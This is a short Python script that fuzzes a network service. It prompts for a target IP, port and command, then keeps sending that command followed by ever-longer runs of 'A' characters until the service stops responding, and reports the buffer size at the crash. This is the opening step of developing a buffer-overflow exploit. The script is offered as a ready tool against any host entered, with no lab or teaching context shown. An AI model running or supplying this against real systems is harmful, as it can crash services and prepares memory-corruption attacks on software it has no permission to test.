#This is a first test, check if the exception are throwed
#!/usr/bin/python

import sys
import socket
import re
from time import sleep

buffer_over_the_rainbow = "A" * 100

#To allow Both Python2 and 3 reading the input
sys.stdout.write("Enter Target IP => ")
sys.stdout.flush()
ip = sys.stdin.readline()
print("you entered: " + ip)

#Regex IP Format
if not re.match(r'[0-9]+(?:\.[0-9]+){3}', ip):
    print('Invalid IP format')


else:
    port = int(input("Enter Port number here: "))
    cmd_name = input("Enter the wanted cmd to check: ")
    #print(type(cmd_name))

    if port >= 1 and port <= 65535:
        while True:
            try:
                    payload = cmd_name + ' /.:/' + buffer_over_the_rainbow
                    print(payload)

                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))

                    print("Sending the payload: " + str(len(payload)))
                    s.send((payload.encode()))
            
                    s.close()
                    sleep(1)
                    buffer_over_the_rainbow += "A"*100
            
            except Exception as e:
                    print(e)
                    print(s.send((payload.encode())))
                    print ("Fuzzing crashed at %s bytes, check the inputs that you have provided" % str(len(buffer_over_the_rainbow)))
                    sys.exit()
    else:
        print("Launch again and Enter a Port number between 1 and 65535: ")